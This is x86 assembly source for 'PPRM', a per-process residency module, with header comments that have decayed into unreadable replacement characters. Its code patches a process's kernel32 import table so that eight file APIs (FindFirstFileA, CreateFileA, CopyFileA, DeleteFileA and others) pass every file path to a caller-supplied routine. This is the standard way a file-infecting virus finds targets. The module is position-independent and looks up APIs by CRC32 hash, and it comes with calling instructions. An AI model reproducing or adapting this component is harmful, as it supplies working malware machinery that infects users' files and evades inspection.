;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;                                                                                                   
;                                                                                                      	 ;
;                                                                                                    	 ;
;            xxxxxxxxxxx    xxxxxxxxxxx    xxxxxxxxxxx    xxxx       xxxx 								 ;
;            xxxxxxxxxxxx   xxxxxxxxxxxx   xxxxxxxxxxxx   xxxxx     xxxxx								 ;
;            xxxx    xxxx   xxxx    xxxx   xxxx    xxxx   xxxxxx   xxxxxx								 ;
;            xxxx    xxxx   xxxx    xxxx   xxxx    xxxx   xxxxxxx xxxxxxx								 ;
;            xxxx    xxxx   xxxx    xxxx   xxxx    xxxx   xxxx xxxxx xxxx								 ;
;            xxxxxxxxxxx    xxxxxxxxxxx    xxxxxxxxxxx    xxxx  xxx  xxxx								 ;
;            xxxxxxxxxx     xxxxxxxxxx     xxxxxxxxxxxx   xxxx       xxxx								 ;
;            xxxx           xxxx           xxxx    xxxx   xxxx       xxxx								 ;
;            xxxx           xxxx           xxxx    xxxx   xxxx       xxxx								 ;
;            xxxx           xxxx           xxxx    xxxx   xxxx       xxxx								 ; 
;																										 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ; 
;								Per-Process Residency Motor												 ; 
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;										     :)!														 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;									    ������� PPRM													 ; 
;							  ����� ������������� �������������											 ;  
;																										 ;
;																										 ;
;����:																									 ;
;1 �������� - ����� ����������� �������, ������� ����� ��������� ����� ������� ������������� ������;	 ;
;2 �������� - ImageBase ������ 																			 ;
;--------------------------------------------------------------------------------------------------------;
;�����:																									 ;
;EAX - ����� ������������� ������ (�������, ��� 0 �������� ������, � ��� ������ ��� ���� ���) 			 ;   		 
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;									  �������															 ;
;																										 ;
;1 ��������:																							 ;
;				�������, ��� ����� ������ ���� 1-�� ����������, ������ ����� ���:						 ;
;																										 ;
;					DWORD xMyResidentFunc(LPVOID lParam);	//���, �������, ����� ���� �����			 ;
;					��� � lParam ����� �������� ����� �������� (�� ����������� ������� ��������������� 	 ;
;					������ ��� ����� ����� ������ (���� � �����/�����). �� ���� ���. 					 ;
;--------------------------------------------------------------------------------------------------------;
;������� GetDelta, xstrlen, small_symbol, xCRC32A ��������� � ������ xBase.asm. ����� ���� ������ ����   ; 
;����� ����������, ���� ����� ������� ������ ������� � ���� ������. ���� � ����� ������� �����			 ; 
;������������� ������ �����. 																			 ;  
;--------------------------------------------------------------------------------------------------------;
;���� ���������� �������� xCRC32A(char *pszFuncName). ����� �������� �������� ������ �������, � �����    ;
;������ ��������� ����� ���� �� ���� ��������������� �������, � �������� ����� ������ ������ ����, ���   ; 
;������������ � ������ ������. 																			 ; 
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;         
;																										 ;
;										y0p!															 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;									  	����															 ;
;																										 ;
;(+) �����������������																					 ;
;(+) delta-offset 																				 		 ;
;(+) ����� � �������������																				 ;
;(+) �� ���������� WinApi'��� 																			 ;
;(+) ������� �������� ������� 																			 ; 
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;									�������������: 														 ;
;																										 ;
;1) �����������:																						 ;
;		xbase.asm, pprm.asm					;���� ���������� ������ pprm.asm, �� ����� ����� xCRC32A �   ;
;											;������ ����������� ����������������						 ; 								  
;2) ����� (������ stdcall):																				 ;
;		push	00400000h					;ImageBase ������ 											 ;
;		push	offset xMyResidentFunc		;����� ����� ����� 											 ;
;		call	PPRM						;�������� ������ ����� 										 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;



												;m1x
											;pr0mix@mail.ru
										;EOF 
 


MAX_LEN_DLLNAME		equ		72					;������������ ����� ����� ��� 
xfunc_pprm			equ		dword ptr [ebp+24h]	;����� ����� ����������� �����  
base_pprm			equ		dword ptr [ebp+28h]	;ImageBase (������ MapViewOfFile) 

delta_pprm			equ		dword ptr [ebp-04]	;������-�������� 
dllname_addr		equ		dword ptr [ebp-04-MAX_LEN_DLLNAME-04]	;����� ��� �������� ����� (����� ���) 

hash_kernel32		equ		06AE69F02h			;��� �� ������ "kernel32.dll"  
end_ht_pprm			equ		0FFFFh				;������� ����� �������� (������ ����)     

                                       


PPRM:
	pushad										;��������� ��������  
	mov		ebp,esp								;[ebp+00]         
	call	GetDelta							;�������� ������-�������� 
	push	eax 								;[ebp-04]
	lea		ecx,dword ptr [xResidentFunc+eax]	;���� �������� �������, ������� ����� ���������� ����� ������������� �������� (����������� ���� �����)  
	lea		edi,dword ptr [hook_table_01+eax]	;�������� ����� ����� ���� ������ ������  
	lea		esi,dword ptr [hook_api_addr+eax]	;�������� ����� ������, ��� ����� ������� ������ ���������� ������       
	push	xfunc_pprm
	pop		dword ptr [ecx]						;� �������� ����� ����� ����������� �����   
	sub		esp,MAX_LEN_DLLNAME					;[ebp-04-MAX_LEN_DLLNAME] ������� � ����� ����� ��� �������� ������ (����� ��������� ���) 
	push	esp									;[ebp-04-MAX_LEN_DLLNAME-04]   
	push	00h									;� ����� ����� ������� �������, ������� ������ ���������� ��������  
	mov		ebx,base_pprm						;EBX = IMAGEBASE
	assume	ebx:ptr IMAGE_DOS_HEADER
	add		ebx,[ebx].e_lfanew
	assume	ebx:ptr IMAGE_NT_HEADERS
	mov		edx,[ebx].OptionalHeader.DataDirectory[1*8].VirtualAddress 
	test	edx,edx								;������� �� � ������ ����� �������� ������� (��) ?    
	je		_pprmret_							;���� ���, �� �� ����� 
	add		edx,base_pprm						;�����, ������� �� VA
	assume	edx:ptr IMAGE_IMPORT_DESCRIPTOR
	cmp		[edx].OriginalFirstThunk,0			;����� ��������, ������� �� ����� �������? (� ��, �����, �����-���� ������� ����� ������ �� ���) 
	je		_pprmret_							;���� ����, ������� 
	 
_cyclehookapi_: 
	call	xSearchApi							;����� �������� ��������������� ������� ������ ������ ������ 
	test	eax,eax								;���� ������ �� �����, ���� ������ ������ ��� �� �����   
	je		_notfoundapi_  
	mov		ecx,dword ptr [ebx]					;�����, � ECX ������ ��������� ����� ��������� ������ ���-����� 
	mov		eax,dword ptr [esi]
	add		eax,delta_pprm						;� EAX - �����, ��� ��������� ����� api  
	mov		dword ptr [eax],ecx					;& ���������  
	mov		ecx,dword ptr [edi+04]  
	add		ecx,delta_pprm						;� ECX ����� �����, ������� ����� ������� ���������� (����� ���������� �������) 
	mov		dword ptr [ebx],ecx					;� ������ ������ ���, � �� ���������� ����� ���� ����������� �����
	inc		dword ptr [esp]						;����������� ������� �� +1  
_notfoundapi_: 
	add		edi,8								;��������� ������  
	lodsd
	cmp		word ptr [edi],end_ht_pprm			;��� �� �������� ������? 
	je		_pprmret_ 
	jmp		_cyclehookapi_      

_pprmret_:
	pop		eax									;������� ������� �� ����� 	 
	mov		dword ptr [ebp+1Ch],eax				;EAX=EAX    
	mov		esp,ebp  
	popad	
	ret		4*2									;�� ����� 
;========================================================================================================
 
;========================================================================================================
;��������������� ����� xSearchApi 
;========================================================================================================
xSearchApi:
	push	edx 
	push	esi
		 
_nextIID_:
	push	edi
	mov		edi,dllname_addr					;� EDI - ����� � ����� (����� ���������� ����� ��� �������� ������)    
	mov		esi,base_pprm;ebx 
	add		esi,[edx].Name1						;� ESI - VA ����� ��� 
	push	esi
	call	xstrlen								;������ ����� �����
	xchg	eax,ecx
	push	edi
	rep		movsb								;� �������� � ���� ����� 
	and		byte ptr [edi],0					;����������� ����    
	pop		edi   

	push	edi
	call	small_symbol						;�������� ������� � ������ �������� 

	push	edi
	call	xCRC32A								;�������� ��� �� ����� ��� 
	 
	pop		edi 

 	cmp		eax,hash_kernel32					;���������� ���������� ��� � ����� �� "kernel32.dll"  
 	jne		_nothookk32_						;���� ���� ������, �� ���������� ������ ������32 
 	mov		ebx,[edx].FirstThunk
 	add		ebx,base_pprm						;����� EBX ��������� IAT    
 	mov		esi,[edx].OriginalFirstThunk		;ESI ��������� �� ������, ��� ������ ���� ����� ������-�������
 	add		esi,base_pprm
 	assume	esi:ptr IMAGE_THUNK_DATA32 
_hnextapi_: 
 	mov		ecx,[esi].u1.AddressOfData 
 	add		ecx,base_pprm
 	assume	ecx:ptr IMAGE_IMPORT_BY_NAME 
 	inc		ecx
 	inc		ecx									;� ECX - ��� ��������� �������
 	push	ecx
 	call	xCRC32A								;�������� ��� �� ����� �����
 	cmp		eax,dword ptr [edi]					;���� �� ��������� � ����� �� ����� � ����� ��������, �� 
 	je		_eqhashapi_							;����������� ����� �������, ������������� ������   
	add		ebx,sizeof IMAGE_THUNK_DATA32		;����� ���������� �����   
	lodsd
	cmp		dword ptr [esi],0					;��� �� ������ � ������ ��� �� ������? 
	jne		_hnextapi_   	   	                                 
_nothookk32_:
 	add		edx,sizeof IMAGE_IMPORT_DESCRIPTOR
 	cmp		[edx].FirstThunk,0					;��� �� ��� � �� �� ������? 
 	jne		_nextIID_           
 	xor		eax,eax
_eqhashapi_:   
_noteqhashapi_:
	pop		esi
	pop		edx  
 	ret											;����������� � �������� ������������     



;========================================================================================================
;�����E����� �����, ������� ����� ������� ����� ����������� �������� 
;======================================================================================================== 
xHookFindFirstFileA: 
	call	xHookHandler						;���������� ����� ��� ���� ������������� ������ ����������, ������� ������ ���� ����������� ����� :)! 
			db 0B8h								;mov	eax,<addr_apifunc> 
	xFunc1	dd 00h
	jmp		eax   
;--------------------------------------------------------------------------------------------------------
xHookCreateFileA:
	call	xHookHandler
			db 0B8h
	xFunc2	dd 00h
	jmp		eax   
;--------------------------------------------------------------------------------------------------------   
xHookCopyFileA:
	call	xHookHandler
			db 0B8h
	xFunc3	dd 00h 
	jmp		eax   
;--------------------------------------------------------------------------------------------------------
xHookMoveFileA:
	call	xHookHandler
			db 0B8h
	xFunc4	dd 00h  
	jmp		eax
;--------------------------------------------------------------------------------------------------------
xHookMoveFileExA:
	call	xHookHandler
			db 0B8h
	xFunc5	dd 00h  
	jmp		eax   
;-------------------------------------------------------------------------------------------------------- 
xHookDeleteFileA: 
	call	xHookHandler
			db 0B8h
	xFunc6	dd 00h   
	jmp		eax   
;--------------------------------------------------------------------------------------------------------
xHookGetFileAttributesA: 
	call	xHookHandler
			db 0B8h
	xFunc7	dd 00h   
	jmp		eax   
;--------------------------------------------------------------------------------------------------------
xHookSetFileAttributesA:  
	call	xHookHandler
			db 0B8h
	xFunc8	dd 00h   
	jmp		eax   
;========================================================================================================   


;========================================================================================================
;���������� ����� (1) ���������� ��� ���� ������������� ������ 
;========================================================================================================
xHookHandler:
	pushad										;��������� �������� 
	pushfd										;� ����� �����   
					db	0B8h					;mov	eax,<addr_myresidentfunc>  
	xResidentFunc	dd	00h 
	push	dword ptr [esp+2Ch]					;�������� � ���� ������ �������� ������������� ������ (��� ������ (���� � �����/�����))   
	call	eax									;�������� ���� ����������� �������   
    popfd
    popad   
	ret
;========================================================================================================  



;========================================================================================================
;�������� ����� (�� ���� ��� ������, ������� �� ����� �����������) � ������������ (winapi funcs)  
;======================================================================================================== 
hook_table_01:  
	dd		0C9EBD5CEh							;FindFirstFileA 
	dd		(offset xHookFindFirstFileA)

	dd		0553B5C78h 							;CreateFileA 
	dd		(offset xHookCreateFileA) 	

	dd		00199DC99h 
	dd		(offset xHookCopyFileA)				;CopyFileA 

	dd		0DE9FF0D1h  
	dd		(offset xHookMoveFileA)

   	dd		08573E006h  
	dd		(offset xHookMoveFileExA) 

	dd		0919B6BCBh    
	dd		(offset xHookDeleteFileA) 

	dd		030601C1Ch  
	dd		(offset xHookGetFileAttributesA) 

	dd		0156B9702h  	   
	dd		(offset xHookSetFileAttributesA)  

	dw		end_ht_pprm
;======================================================================================================== 	 


;========================================================================================================
;� ���� �������� ���������� ������ ������������� ������  
;======================================================================================================== 
hook_api_addr: 
	dd 		(offset xFunc1)
	dd 		(offset xFunc2)
	dd		(offset xFunc3) 
	dd		(offset xFunc4)
	dd		(offset xFunc5)
	dd		(offset xFunc6)
	dd		(offset xFunc7)
	dd		(offset xFunc8)  
	;dw		end_ht_pprm
;======================================================================================================== 	 

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ����� PPRM 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 



              

comment !   
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;function GetDelta
;��������� ������-�������� 
;�����:
;��� - ������-�������� 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
GetDelta:
	call	_delta_
	mov		esp,ebp								;������������� 
	pop		ebp
	ret
_delta_:
	pop		eax
	sub		eax,(_delta_ - 4)
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ������� GetDelta 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;������� xstrlen
;����� ����� ������
;���� ( xstrlen(char *pszStr) ):
;pszStr - ��������� �� ������, ��� ����� ���� ��������� 
;�����:
;EAX    - ����� ������ (� ������) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xstrlen:
	push	edi		 
	mov		edi,dword ptr [esp+08]
	push	edi  
	xor		eax,eax
_numsymbol_: 
	scasb
	jne		_numsymbol_
	xchg	eax,edi
	dec		eax
	pop		edi
	sub		eax,edi
	pop		edi  
	ret		4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ������� xstrlen 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;������� small_symbol
;���������� ���0� ������ � ������ ����
;���� ( small_symbol(char *pszStr) ):
;pszStr - ��������� �� ������ (��� ����� ������)
;�����:
;(+) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
small_symbol: 
	mov		eax,dword ptr [esp+04]   
_nxtsymbol_:	  
	cmp		byte ptr [eax],65
	jb		_skip01_ 
	cmp		byte ptr [eax],90
	ja		_skip01_  
	add		byte ptr [eax],32  
_skip01_: 
	cmp		byte ptr [eax],0
	je		_ssret_
	inc		eax 
	jmp		_nxtsymbol_  

_ssret_:
	mov		eax,dword ptr [esp+04] 
	ret		4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ����� small_symbol 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;������� xCRC32A
;���������� CRC ������
;���� (stdcall) (xCRC32A(char *pszStr)):
;	pszStr - ������, ��� ��� ���� ��������� 
;�����:
;	(+) EAX - ��� �� ������ 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xCRC32A:
	push	ecx
	mov		ecx,dword ptr [esp+08]   
	push	ecx
	call	xstrlen
	test	eax,eax
	je		_xcrc32aret_
	push	eax
	push	ecx 
	call	xCRC32
_xcrc32aret_: 
	pop		ecx 
	ret		4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ������� xCRC32A 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 			




	 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;������� xCRC32
;������� CRC32 
;���� (stdcall) (xCRC32(BYTE *pBuffer,DWORD dwSize)):
;	pBuffer - �����, � ������� ���, ��� crc32 ���� ���������
;	dwSize  - ������� ���� ��������� ? (+) 
;�����:
;	(+) EAX - CRC32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xCRC32:
	pushad
	mov		ebp,esp
	xor		eax,eax
	mov		edx,dword ptr [ebp+24h]
	mov		ecx,dword ptr [ebp+28h]
	jecxz	@4 
	dec		eax 
@1:
	xor		al,byte ptr [edx]
	inc		edx
	push	08
	pop		ebx
@2:
	shr		eax,1
	jnc		@3
	xor		eax,0EDB88320h
@3:
	dec		ebx 
	jnz		@2
	loop	@1
	not		eax
@4:
	mov		dword ptr [ebp+1Ch],eax 
	popad
	ret		4*2 							
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx		
;����� ������� xCRC32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	
		;! 
           
;XD 
 